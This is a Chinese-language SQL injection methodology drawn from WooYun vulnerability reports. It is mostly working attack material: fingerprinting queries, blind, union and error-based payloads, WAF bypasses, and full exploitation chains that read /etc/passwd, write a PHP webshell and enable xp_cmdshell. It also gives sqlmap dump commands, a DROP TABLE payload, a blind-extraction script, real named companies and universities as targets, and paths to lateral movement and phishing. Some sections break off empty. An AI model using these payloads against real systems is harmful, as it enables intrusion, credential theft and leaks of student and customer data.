# SQL注入漏洞分析方法论

> 基于WooYun 27,732个真实SQL注入漏洞案例提炼的实战方法论
> 数据来源：wooyun_vulnerabilities.json (88,636条漏洞，其中SQL注入27,732条)

---

## 一、方法论框架

### 1.1 核心思维模型

```
输入验证缺失 → 动态SQL拼接 → 语义边界突破 → 数据库指令执行
```

**关键洞察**：SQL注入的本质是**代码与数据边界的混淆**。攻击者通过控制输入，将原本应被视为数据的内容提升为可执行的SQL指令。

### 1.2 攻击向量分类

| 向量类型 | 占比 | 典型场景 |
|---------|------|---------|
| 登录框注入 | 66% | 用户名/密码字段直接拼接 |
| 搜索框注入 | 64% | LIKE语句模糊匹配 |
| POST参数注入 | 60% | 表单提交数据 |
| HTTP头注入 | 26% | User-Agent/Referer/X-Forwarded-For |
| GET参数注入 | 24% | URL参数传递 |
| Cookie注入 | 12% | 会话标识符处理 |

---

## 二、注入点识别模式

### 2.1 高危参数名（按出现频率排序）

```python
# 从27732个案例中提取的高频注入参数
TOP_VULNERABLE_PARAMS = {
    # 数字型ID类（最常见）
    'id': 56,           # 资源标识
    'sort_id': 37,      # 排序字段
    'stid': 32,         # 状态ID
    'fid': 8,           # 论坛/文件ID
    'hotelid': 11,      # 业务实体ID
    'areainfoid': 8,    # 地区信息

    # 认证相关（高危）
    'username': 33,     # 用户名
    'password': 30,     # 密码
    'userpwd': 11,      # 密码变体

    # 业务逻辑参数
    'type': 18,         # 类型选择
    'action': 7,        # 操作类型
    'page': 4,          # 分页参数
    'name': 30,         # 名称搜索

    # ASP.NET特有（.NET应用重点关注）
    '__viewstate': 58,
    '__eventvalidation': 56,
    '__eventargument': 52,
    '__eventtarget': 41,
}
```

### 2.2 URL模式识别

**高危URL模式**：
```
# 列表/详情页面
/news/detail.php?id=1
/product/view.aspx?pid=123
/article.asp?aid=456

# 搜索功能
/search.php?keyword=test
/list.aspx?stid=5882&pageid=2

# 管理后台
/admin/login.aspx
/manage/user.php?action=edit&uid=1

# API接口
/api/getData.php?type=user&id=1
/service/query.aspx?cn=value
```

### 2.3 文件类型风险评估

| 文件类型 | 风险等级 | 典型数据库 |
|---------|---------|-----------|
| .php | 高 | MySQL |
| .aspx | 高 | MSSQL/Oracle |
| .asp | 高 | Access/MSSQL |
| .jsp | 中 | Oracle/MySQL |
| .do/.action | 中 | Oracle/MySQL |

---

## 三、数据库类型判断方法

### 3.1 指纹识别技术

#### MySQL识别
```sql
-- 版本探测
AND @@version LIKE '%MySQL%'
AND version() IS NOT NULL

-- 特有函数
AND sleep(5)
AND benchmark(10000000,sha1('test'))

-- 系统表
AND (SELECT 1 FROM information_schema.tables LIMIT 1)

-- 错误特征
"You have an error in your SQL syntax"
"Unknown column"
```

#### MSSQL识别
```sql
-- 版本探测
AND @@version LIKE '%Microsoft%'
AND db_name() IS NOT NULL

-- 特有函数
WAITFOR DELAY '0:0:5'
CONVERT(INT, @@version)

-- 系统表
AND (SELECT 1 FROM sysobjects WHERE xtype='U')

-- 错误特征
"Unclosed quotation mark"
"Microsoft OLE DB Provider"
"Incorrect syntax near"
```

#### Oracle识别
```sql
-- 版本探测
AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL

-- 特有语法
AND 1=1 FROM dual
AND rownum=1

-- 特有函数
CHR(65)||CHR(66)
UTL_HTTP.request('https://example.com/[已脱敏]')

-- 错误特征
"ORA-00942: table or view does not exist"
"ORA-01756: quoted string not properly terminated"
```

#### Access识别
```sql
-- 特有语法
AND (SELECT TOP 1 1 FROM MSysObjects)
AND 1=1--    (不支持#注释)

-- 错误特征
"Microsoft JET Database Engine"
"Syntax error in query expression"
```

### 3.2 自动化判断流程

```
步骤1: 触发错误
  输入: ' " ) ; --
  观察: 错误信息特征

步骤2: 函数探测
  MySQL: sleep(2)
  MSSQL: waitfor delay '0:0:2'
  Oracle: dbms_pipe.receive_message('a',2)

步骤3: 系统表验证
  MySQL: information_schema.tables
  MSSQL: sysobjects
  Oracle: all_tables
  Access: MSysObjects
```

---

## 四、注入技术类型与Payload

### 4.1 技术分布统计

| 技术类型 | 出现频率 | 难度 | 数据获取效率 |
|---------|---------|------|-------------|
| 布尔盲注 | 50% | 中 | 低 |
| 报错注入 | 46% | 低 | 高 |
| 时间盲注 | 34% | 高 | 极低 |
| 联合查询 | 36% | 低 | 极高 |
| 堆叠查询 | 20% | 中 | 高 |
| 高权限利用 | 68% | - | - |

### 4.2 布尔盲注Payload

```sql
-- 基本布尔
id=1 AND 1=1    -- 正常
id=1 AND 1=2    -- 异常

-- 字符型
id=1' AND '1'='1
id=1' AND '1'='2

-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))

-- 数据提取（逐字符）
id=1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
```

### 4.3 时间盲注Payload

```sql
-- MySQL
id=1 AND sleep(5)
id=1 AND IF(1=1,sleep(5),0)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))

-- 嵌套延迟（实际案例）
id=(select(2)from(select(sleep(8)))v)

-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
id=1 IF (1=1) WAITFOR DELAY '0:0:5'

-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

### 4.4 联合查询Payload

```sql
-- 列数探测
id=1 ORDER BY 1--
id=1 ORDER BY 2--
...
id=1 ORDER BY N-- (报错时N-1为列数)

-- 联合注入
id=-1 UNION SELECT 1,2,3,4,5--
id=-1 UNION SELECT null,null,null--

-- 数据提取
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

### 4.5 报错注入Payload

```sql
-- MySQL extractvalue
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))

-- MySQL updatexml
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
id=1 AND updatexml(1,concat(0x5c,database()),1)

-- MySQL floor报错
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)

-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
id=1 AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))

-- 实际案例Payload
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4329=4329) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'a'='a
```

---

## 五、WAF/过滤绕过技巧

### 5.1 内联注释绕过

```sql
-- MySQL版本注释（最常用）
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3

-- 实际案例（DeDeCMS绕过）
aid=1&_FILES[type][tmp_name]=\' or mid=@`\'` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `#@__admin` limit 0,1),5,6,7,8,9#@`\'`
```

### 5.2 编码绕过

```sql
-- 十六进制编码
SELECT * FROM users WHERE name=0x61646d696e    -- 'admin'
CONCAT(0x7e,database(),0x7e)                   -- concat('~',database(),'~')

-- URL编码
union%20select → union select
%27 → '
%23 → #

-- 双重URL编码
%252f → /
%2527 → '

-- Unicode编码
%u0027 → '
%u002f → /
```

### 5.3 大小写混淆

```sql
-- 简单混淆
UnIoN SeLeCt
uNiOn sElEcT

-- 随机大小写
UNION/**/SELECT
```

### 5.4 空白符替换

```sql
-- 注释替代空格
UNION/**/SELECT/**/1,2,3
UNION/*abc*/SELECT

-- Tab/换行
UNION%09SELECT
UNION%0ASELECT
UNION%0DSELECT

-- 括号包裹
(UNION)(SELECT)
```

### 5.5 函数替代

```sql
-- 字符串截取
SUBSTRING → MID/SUBSTR/LEFT/RIGHT
-- MySQL
MID(password,1,1)
SUBSTR(password,1,1)

-- 字符转换
CHAR(65) → A
CHR(65) → A (Oracle)

-- 拼接函数
CONCAT → CONCAT_WS/||
```

### 5.6 逻辑等价替换

```sql
-- AND/OR替换
AND 1=1 → && 1=1 → & 1
OR 1=1 → || 1=1 → | 1

-- 等号替换
id=1 → id LIKE 1
id=1 → id BETWEEN 1 AND 1
id=1 → id IN (1)
id=1 → id REGEXP '^1$'

-- 引号绕过
'admin' → CHAR(97,100,109,105,110)
'admin' → 0x61646d696e
```

---

## 六、利用链构造方法

### 6.1 标准利用流程

```
阶段1: 确认注入点
  ├── 单引号测试: id=1'
  ├── 数学运算: id=1-0, id=1*1
  └── 时间延迟: id=1 and sleep(3)

阶段2: 判断数据库类型
  ├── 错误信息分析
  └── 特征函数探测

阶段3: 获取数据库信息
  ├── 当前数据库: database()
  ├── 当前用户: user()
  ├── 版本信息: version()
  └── 权限检测: is_dba

阶段4: 枚举数据库结构
  ├── 数据库列表
  ├── 表名列表
  └── 列名列表

阶段5: 数据提取
  ├── 敏感表定位
  └── 数据导出

阶段6: 权限提升（可选）
  ├── 文件读写
  └── 命令执行
```

### 6.2 MySQL完整利用链

```sql
-- Step 1: 获取数据库信息
union select 1,database(),version(),user(),5--

-- Step 2: 获取所有数据库
union select 1,group_concat(schema_name),3 from information_schema.schemata--

-- Step 3: 获取当前库所有表
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--

-- Step 4: 获取指定表的列名
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--

-- Step 5: 提取数据
union select 1,group_concat(username,0x3a,password),3 from users--

-- Step 6: 文件读取（需FILE权限）
union select 1,load_file('/etc/passwd'),3--

-- Step 7: 写入WebShell（需写权限）
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

### 6.3 MSSQL完整利用链

```sql
-- Step 1: 获取系统信息
union select 1,@@version,db_name(),system_user,5--

-- Step 2: 获取所有数据库
union select 1,name,3 from master..sysdatabases--

-- Step 3: 获取当前库所有表
union select 1,name,3 from sysobjects where xtype='U'--

-- Step 4: 获取指定表的列名
union select 1,name,3 from syscolumns where id=object_id('users')--

-- Step 5: 提取数据
union select 1,username+':'+password,3 from users--

-- Step 6: 命令执行（需sa权限）
; exec master..xp_cmdshell 'whoami'--

-- Step 7: 启用xp_cmdshell
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
```

### 6.4 Oracle完整利用链

```sql
-- Step 1: 获取系统信息
union select banner,null from v$version where rownum=1--

-- Step 2: 获取当前用户
union select user,null from dual--

-- Step 3: 获取所有表
union select table_name,null from all_tables where rownum<=10--

-- Step 4: 获取表结构
union select column_name,null from all_tab_columns where table_name='USERS'--

-- Step 5: 提取数据
union select username||':'||password,null from users--
```

---

## 七、漏洞代码模式

### 7.1 PHP典型漏洞模式

```php
// 模式1: 直接拼接（最常见）
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";

// 模式2: 字符串拼接
$username = $_POST['username'];
$sql = "SELECT * FROM users WHERE username = '$username'";

// 模式3: 不安全的过滤
$id = addslashes($_GET['id']);  // 数字型注入无效
$sql = "SELECT * FROM users WHERE id = $id";

// 模式4: 宽字节注入
$name = addslashes($_GET['name']);
// GBK编码下 %bf%27 可绕过
```

### 7.2 ASP/ASP.NET典型漏洞模式

```vb
' ASP经典模式
id = Request("id")
sql = "SELECT * FROM users WHERE id=" & id

' ASP.NET参数直接拼接
string id = Request.QueryString["id"];
string sql = "SELECT * FROM users WHERE id=" + id;
```

### 7.3 Java典型漏洞模式

```java
// 字符串拼接
String id = request.getParameter("id");
String sql = "SELECT * FROM users WHERE id = " + id;
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// MyBatis ${}使用不当
// <select id="getUser">
//     SELECT * FROM users WHERE id = ${id}  <!-- 应使用 #{id} -->
// </select>
```


## 八、案例摘要

### 8.1 高危案例：DBA权限获取

**案例ID**: wooyun-2015-0157074

**目标**: 广州市嘉航软件科技有限公司

**注入点**: POST参数 `txtuser`

**技术**: 报错注入 + 布尔盲注

**Payload**:
```sql
txtuser=-7004' OR 6089=6089#
txtuser=-8086' OR 1 GROUP BY CONCAT(0x716b767171,(SELECT (CASE WHEN (5800=5800) THEN 1 ELSE 0 END)),0x7171627171,FLOOR(RAND(0)*2)) HAVING MIN(0)#
```

**结果**: DBA权限，获取root密码哈希及512条用户密码

---

### 8.2 时间盲注案例

**案例ID**: wooyun-2015-0114228

**目标**: 广州市特网网络科技有限公司

**注入点**: GET参数 `hotelid`

**Payload**:
```sql
hotelid=(select(2)from(select(sleep(8)))v)/*'+(select(0)from(select(sleep(0)))v)+'
hotelid=(SELECT (CASE WHEN (8177=8177) THEN SLEEP(10) ELSE 8177*(SELECT 8177 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
```

**特点**: 双层SELECT嵌套实现延迟翻倍

---

### 8.3 内联注释绕过案例

**案例ID**: wooyun-2015-0113920

**目标**: 盛大（DeDeCMS系统）

**绕过技术**: MySQL版本注释

**Payload**:
```
/plus/recommend.php?aid=1&_FILES[type][tmp_name]=aa\'and+char(@`\'`)
+/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x3C6162633E,
group_concat(0x7C,userid,0x3a,pwd,0x7C),0x3C2F6162633E),5,6,7,8,9
+from+`#@__admin`#"
```

---

### 8.4 MSSQL命令执行案例

**案例ID**: wooyun-2015-0115882

**目标**: 奥教育考生登录系统

**注入点**: POST参数 `PassWord`

**Payload**:
```sql
PassWord=' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+CHAR(113)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (4329=4329) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(122)+CHAR(113))) AND 'a'='a
```

**特点**: CHAR函数绕过字符过滤，CONVERT报错注入

---

## 九、测试流程Checklist

### 9.1 快速检测流程

```markdown
□ 1. 单引号测试: 输入 ' 观察响应
□ 2. 双引号测试: 输入 " 观察响应
□ 3. 注释测试: 输入 --、#、/**/ 观察响应
□ 4. 数学运算: 输入 1-0、1*1 观察响应
□ 5. 布尔测试: and 1=1 / and 1=2 对比
□ 6. 时间延迟: and sleep(5) 观察响应时间
□ 7. 排序测试: order by N 递增测试
```

### 9.2 SQLMap常用参数

```bash
# 基础检测
sqlmap -u "http://target/page.php?id=1" --batch

# POST请求
sqlmap -u "http://target/login.php" --data="username=test&password=test" --batch

# Cookie注入
sqlmap -u "http://target/page.php" --cookie="id=1" --level=2 --batch

# HTTP头注入
sqlmap -u "http://target/page.php" --headers="X-Forwarded-For: 1" --level=3 --batch

# 时间盲注优化
sqlmap -u "http://target/page.php?id=1" --technique=T --time-sec=2 --batch

# 绕过WAF
sqlmap -u "http://target/page.php?id=1" --tamper=space2comment,between --batch

# 获取数据
sqlmap -u "http://target/page.php?id=1" --dbs --batch
sqlmap -u "http://target/page.php?id=1" -D database --tables --batch
sqlmap -u "http://target/page.php?id=1" -D database -T table --columns --batch
sqlmap -u "http://target/page.php?id=1" -D database -T table -C col1,col2 --dump --batch
```

---


## 附录：数据统计

### A. 年度趋势

| 年份 | 数量 | 占比 |
|-----|------|------|
| 2010 | 158 | 0.6% |
| 2011 | 320 | 1.2% |
| 2012 | 1,115 | 4.0% |
| 2013 | 3,058 | 11.0% |
| 2014 | 7,375 | 26.6% |
| 2015 | 13,802 | 49.8% |
| 2016 | 1,904 | 6.9% |

### B. 行业分布

| 行业 | 数量 | 占比 |
|-----|------|------|
| 互联网/其他 | 23,679 | 85.4% |
| 教育 | 2,751 | 9.9% |
| 金融 | 461 | 1.7% |
| 政府 | 422 | 1.5% |
| 电商 | 243 | 0.9% |

### C. 数据库分布（Top 50详细案例）

| 数据库 | 数量 |
|-------|------|
| MySQL | 23 |
| Access | 17 |
| MSSQL | 14 |
| Oracle | 10 |
| PostgreSQL | 2 |

---

## 案例分析 #1：Access数据库布尔盲注实战

### 知识点来源
- **案例**: wooyun-2015-0107553
- **标题**: 谷秋精品课程管理系统SQL注入
- **厂商**: 南京深图计算机技术有限公司
- **影响**: 大量高校使用的精品课程管理系统

### 元思考抽象

**核心问题识别**：
- Access数据库缺乏系统元数据表（无information_schema等价物）
- SQLMap等自动化工具在无法枚举表名时会失败
- 攻击者需要通过**源码泄露**或**推测表名**来完成利用链

**开发者错误假设**：

### 思考洞察逻辑

**攻击路径分析**：
```
1. 注入点发现 → 2. 数据库类型识别 → 3. 工具自动化失败 → 4. 源码获取策略 → 5. 表名枚举 → 6. 手工盲注
```

**关键触发点**：
- **参数类型**: GET参数 `id`（数字型）
- **注入类型**: Boolean-based blind（布尔盲注）
- **注入位置**: WHERE/HAVING子句
- **数据库特征**: Microsoft Access（Windows 2003/XP + IIS 6.0 + ASP.NET 2.0.50727）

**边界条件**：
- 必须是数字型注入点（字符型需要闭合引号）
- 应用必须有差异数据响应（True/False返回不同内容）
- 需要知道准确的表名和列名

**关联因素**：
- 目标系统官网提供源码下载
- 用户表命名规律：`C_User`（C前缀可能是Class/Company缩写）
- 大量高校使用同一系统（批量攻击可能性）

### 测试过程

```markdown
步骤1: 注入点探测
  └─ 输入: action=update&id=8 AND 1=1
     ├─ True: 页面正常返回
     └─ 输入: action=update&id=8 AND 1=2
        └─ False: 页面异常/数据缺失

步骤2: 数据库类型识别（SQLMap自动完成）
  ├─ 排除MySQL: sleep()无效
  ├─ 排除Oracle: rownum语法无效
  ├─ 排除MSSQL: @@version无效
  ├─ 排除SQLite: 特定系统表无效
  └─ 确认Access: (SELECT TOP 1 1 FROM MSysObjects) 有效

步骤3: 自动化工具尝试（SQLMap）
  ├─ 使用Access字典爆破表名: 失败（Access无information_schema）
  ├─ 尝试常见表名字典: 失败
  └─ 阻塞点: 缺乏表名元数据

步骤4: 源码获取策略
  ├─ 访问官网: www.guqiu.com
  ├─ 下载完整系统源码
  └─ 分析数据库设计文件/代码

步骤5: 表名提取
  ├─ 定位用户相关代码模块
  ├─ 查找数据库表定义
  └─ 确认用户表: C_User

步骤6: 手工布尔盲注
  └─ 构造逐字符提取Payload
```

### 利用方法

**基础布尔盲注Payload**：
```sql
-- 数字型注入（无需引号闭合）
action=update&id=8 AND 5342=5342  -- True
action=update&id=8 AND 5342=5343  -- False
```

**Access数据提取Payload**（手工构造）：
```sql
-- 逐字符提取用户名（假设第1个字符）
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) > 97

-- 完整盲注流程
-- 1. 确定用户名长度
action=update&id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5

-- 2. 逐字符猜解
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97  -- 'a'
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 98  -- 'b'

-- 3. 密码哈希提取
action=update&id=8 AND ASCII((SELECT TOP 1 MID(password,1,1) FROM C_User WHERE username='admin')) > 48

-- 4. 多用户枚举（使用NOT IN）
action=update&id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

**时间盲注替代方案**（Access不支持SLEEP）：
```sql
-- Access暴力计数延迟（低效但可行）
action=update&id=8 AND (SELECT COUNT(*) FROM C_User AS T1, C_User AS T2, C_User AS T3, C_User AS T4, C_User AS T5, C_User AS T6, C_User AS T7, C_User AS T8, C_User AS T9, C_User AS T10) > 0
-- 笛卡尔积延迟，记录数呈指数增长
```

### 绕过技巧

| 绕过类型 | 具体技巧 | 适用场景 |
|---------|---------|---------|
| **表名枚举限制** | 官网下载源码 → 静态分析获取表结构 | 厂商提供源码下载的开源/商业系统 |
| **自动化工具失效** | 从SQLMap切换到手工盲注脚本 | Access等无元数据表的数据库 |
| **数据库名识别** | SQLMap逐个测试数据库特征指纹 | 数据库类型未知时 |
| **批量攻击** | 表名重用规律（如C_User前缀） | 同一厂商多站点部署 |

**Access数据库独特限制**：
```sql
-- 1. 不支持的特性
❌ UNION SELECT（某些Access版本）
❌ 子查询嵌套深度有限
❌ 无SLEEP/WAITFOR等延迟函数
❌ 无information_schema系统表
❌ 注释符仅支持 -- (不支持#)

-- 2. 特有语法（可利用）
✅ TOP子句: SELECT TOP 1 * FROM table
✅ MID函数: MID(string, start, length)
✅ ASC函数: ASC('A') = 65
✅ IIF函数: IIF(condition, true_value, false_value)
✅ DISTINCTROW去重
```

**手工盲注脚本优化思路**：
```python
# INTJ视角的效率优化策略
class AccessBlindInjector:
    """
    核心洞察：
    1. 二分法猜解字符（减少50%请求）
    2. 并发多字符提取（异步IO）
    3. 缓存表名/列名映射（复用）
    4. 自适应延迟调整（避免触发告警）
    """

    def binary_search_char(self, query_template, position):
        """使用二分法猜解单个字符"""
        # ASCII 32-126范围 → 最多7次请求（vs 94次线性）
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if self.test_payload(query_template.format(pos=position, val=mid)):
                low = mid + 1
            else:
                high = mid - 1
        return chr(high)

    def batch_extract_users(self):
        """批量提取用户数据"""
        # 先获取所有用户ID
        # 再并发提取用户名/密码
        # 最后本地组合数据
        pass
```


### 扩展攻击面

**从单表到多表**：
```sql
-- 1. 枚举所有表（基于命名规律）
SELECT * FROM C_Admin    -- 管理员
SELECT * FROM C_User     -- 用户
SELECT * FROM C_Teacher  -- 教师
SELECT * FROM C_Student  -- 学生
SELECT * FROM C_Course   -- 课程

-- 2. 利用系统表（需权限）
SELECT name FROM MSysObjects WHERE type=1 AND flags=0
-- 返回所有用户表名（但默认权限不足）
```

**从Access到系统权限**：
```
Access注入 → 文件上传漏洞 → WebShell
           ↓
       .mdb下载 → 本地破解 → 管理员密码
           ↓
       批量高校站点 → 教育网横向渗透
```

---

## 案例分析 #2：教育类网站子站SQL注入模式

### 知识点来源
- **案例**: wooyun-2015-0137200
- **标题**: 某单位存在安全漏洞某子站SQL注射
- **厂商**: 中山大学（985高校）
- **影响**: 教育机构子站系统

### 元思考抽象

**核心问题识别**：
- 高校网站架构呈现**主站+子站**分散管理模式
### 测试过程

```markdown
步骤1: 子站枚举（信息收集）
  ├─ 方法1: 搜索引擎语法
  │   └─ site:sysu.edu.cn -www
  ├─ 方法2: 证书透明度日志（crt.sh）
  │   └─ 查询 *.sysu.edu.cn 的所有子域名
  ├─ 方法3: DNS域传送漏洞
  │   └─ axfr @dns.sysu.edu.cn sysu.edu.cn
  └─ 方法4: 子域名爆破工具
      └─ sublist3r -d sysu.edu.cn

步骤2: 技术栈识别
  ├─ HTTP响应头: X-Powered-By: PHP/5.3.29
  ├─ 文件扩展名: .php / .asp / .aspx
  ├─ 目录扫描: /admin/ /backup/ /uploads/
  ├─ CMS指纹: Wappalyzer / WhatWeb识别
  └─ 错误页面: 泄露绝对路径 / 数据库版本

步骤3: 参数发现
  ├─ 爬虫抓取: Spider抓取所有链接
  ├─ 常见参数: id, pid, aid, uid, cat, type, page
  ├─ 测试输入: 1, 1', 1", 1 and 1=1
  └─ 观察响应: 错误信息 / 页面差异 / 响应时间

步骤4: 注入点验证
  ├─ 布尔测试: id=1 and 1=1（正常）/ id=1 and 1=2（异常）
  ├─ 报错测试: id=1'（触发SQL语法错误）
  ├─ 联合测试: id=1 union select 1,2,3--
  └─ 时间测试: id=1 and sleep(5)--

步骤5: 数据库指纹识别
  ├─ MySQL: version(), sleep(), information_schema
  ├─ MSSQL: @@version, waitfor delay, sysobjects
  ├─ Access: MSysObjects, 不支持#注释
  └─ PostgreSQL: version(), pg_sleep

步骤6: 数据提取
  ├─ 枚举数据库: schema_name / db_name()
  ├─ 枚举表名: table_name / name
  ├─ 枚举列名: column_name / 系统表查询
  └─ 导出敏感数据: 用户表 / 管理员表 / 学生信息
```

### 利用方法

**基础注入Payload**（案例中的简单模式）：
```sql
-- 单引号测试（字符型注入）
id=1' AND 1=1--

-- 数字型注入
id=1 AND 1=1--
id=1 AND 1=2--

-- 堆叠查询（某些数据库支持）
id=1; DROP TABLE users--

-- 绕过简单过滤（注释符）
id=1' /*!00000AND*/ 1=1--
```

**教育类网站常见敏感表**（基于WooYun统计）：
```sql
-- 学生信息表
SELECT * FROM student
SELECT * FROM student_info
SELECT * FROM xs_xjxx (学籍信息)

-- 教师信息表
SELECT * FROM teacher
SELECT * FROM faculty
SELECT * FROM js_jbxx (教师基本信息)

-- 管理员表
SELECT * FROM admin
SELECT * FROM administrator
SELECT * FROM users WHERE role='admin'

-- 成绩表
SELECT * FROM score
SELECT * FROM cj_cjxx (成绩信息)

-- 课程表
SELECT * FROM course
SELECT * FROM kc_kcxx (课程信息)
```

**批量子站利用思路**：
### 绕过技巧

| 场景 | 绕过方法 | 说明 |
|-----|---------|------|
| **简单过滤** | `id=1' OR '1'='1` | 闭合引号后构造恒真条件 |
| **addslashes()** | 宽字节注入：`%bf%27` | GBK编码下多字节字符绕过 |
| **过滤空格** | `/**/`, `%09`, `/**/union/**/select` | 注释/Tab替代空格 |
| **过滤AND/OR** | `&&`, `||`, `%26%26`, `%7C%7C` | 符号替代 |
| **过滤UNION** | `/*!00000union*/`, `UnIoN` | 内联注释/大小写混淆 |
| **过滤SELECT** | `/*!00000select*/`, `SeLeCt` | 内联注释/大小写混淆 |
| **WAF拦截** | `id=1` + 分块传输 | HTTP分块编码绕过 |
| **参数污染** | `id=1&id=2` | 重复参数混淆应用逻辑 |

**教育类网站特定绕过**：
```sql
-- 1. 绕过IP白名单
X-Forwarded-For: [IP已脱敏]
X-Real-IP: [IP已脱敏]
Client-IP: [IP已脱敏]

-- 2. 绕过Cookie验证
Cookie: PHPSESSID=admin'; --
Cookie: session_id=1' OR '1'='1

-- 3. 绕过Referer检查
Referer: https://example.com/[已脱敏]

-- 4. 绕过User-Agent限制（爬虫伪装）
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)

-- 5. 绕过HTTPS强制跳转
X-Forwarded-Proto: https
```

**从子站到内网**：
```sql
-- 1. 读取数据库配置文件
union select 1,load_file('/var/www/html/config.php'),3--

-- 2. 发现主站数据库连接
-- config.php内容：
-- $db_host = "[IP已脱敏]"
-- $db_user = "admin"
-- $db_pass = "P@ssw0rd"

-- 3. 连接主站数据库
-- 通过子站服务器执行：
-- mysql -h [IP已脱敏] -u admin -p P@ssw0rd

-- 4. 导出主站数据
-- 主站数据库可能包含：
-- 全校师生信息
-- 财务系统数据
-- 科研项目信息
-- 邮件服务器凭证
```

**从SQL注入到RCE**：
```
子站SQL注入 → 写入WebShell → 系统权限
         ↓
     读取配置文件 → 获取内网凭证 → 横向移动
         ↓
     批量子站利用 → 教育网渗透 → 其他高校
```

**社会工程学结合**：
```
子站漏洞 → 获取管理员邮箱 → 钓鱼攻击主站管理员
         ↓
     获取师生信息 → 定向钓鱼 → 主站VPN凭证
         ↓
     窃取科研成果 → 学术欺诈 / 数据勒索
```

---


## 案例分析 #3：需要认证的P2P网贷系统SQL注入

### 知识点来源
- **案例**: wooyun-2015-0143727 (Dswjcms! X1.3 SQL注入多处)
- **相关案例**:
  - wooyun-2015-0143727: Dswjcms X1.3 多处SQL注入（需要登录会员）
  - wooyun-2015-0110xxx: Dswjcms P2P网贷系统前台SQL注入
  - wooyun-2015-0110xxx: Dswjcms 1.4 SQL盲注漏洞
- **厂商**: Dswjcms.com（专注ThinkPHP框架的P2P网贷系统）
- **影响**: 大量网贷平台使用该系统

### 元思考抽象

**核心问题识别**：
- **认证后的隐藏攻击面**：需要会员登录才能触发的SQL注入点，常规扫描器无法覆盖
- **ThinkPHP框架漏洞模式**：框架本身提供的安全机制被开发者误用或绕过

**攻击路径分析**：
```
1. 前期信息收集 → 2. 注册/获取低权限账号 → 3. 登录认证 → 4. 业务功能遍历 → 5. 参数注入测试
```

**关键触发点**：
- **认证机制**：需要注册普通会员账号（部分系统支持公开注册）
- **注入位置**：
  - 业务ID参数：`bid`（标的ID）、`uid`（用户ID）、`id`（通用ID）
  - 查询参数：`mid`（模块ID）、`nper`（期数）
  - POST参数：`email`（邮箱）、`out_trade_no`（交易号）
- **注入类型**：
  - 数字型注入：`where('bid='.$this->_get('bid'))`
  - 混合型注入：`where('`id`="'.$id.'" and `email`="'.$email.'")`
- **数据库特征**：MySQL（ThinkPHP默认）

**边界条件**：
- 必须拥有有效的登录Session（`$this->_session('user_uid')`）
- 注入参数需与当前用户权限关联（如只能查询自己的数据）
- 部分功能需要特定业务数据存在（如投资记录、还款计划）

**关联因素**：
- ThinkPHP 3.x框架的M()方法直接拼接问题
- 伪静态URL模式（`.html`后缀需去除测试）
- P2P网贷业务逻辑：投标、还款、充值等核心功能

### 测试过程

```markdown
步骤1: 前期信息收集
  ├─ 识别CMS版本: Dswjcms X1.3 / 1.4
  ├─ 确认框架: ThinkPHP 3.x（通过目录结构 /Lib/Action/）
  ├─ 搜索引擎语法: Google "Powered by Dswjcms" 或 "Dswjcms借贷系统"
  └─ 找到注册入口: /Logo/register.html

步骤2: 账号注册与登录
  ├─ 注册普通会员账号（通常只需邮箱+密码）
  ├─ 登录系统获取Session/Cookie
  ├─ 使用Burp Suite抓取登录后的请求头
  └─ 保存Cookie用于后续测试

步骤3: 业务功能遍历
  ├─ 投资相关: /Center/invest (投标列表)
  ├─ 借款相关: /Center/loan (借款管理)
  ├─ 充值提现: /Center/recharge
  ├─ 消息中心: /Center/stationexit
  └─ 个人设置: /Center/emailVerify

步骤4: 参数注入测试（以invest为例）
  └─ 测试URL: /Center/invest/?mid=plan&bid=1
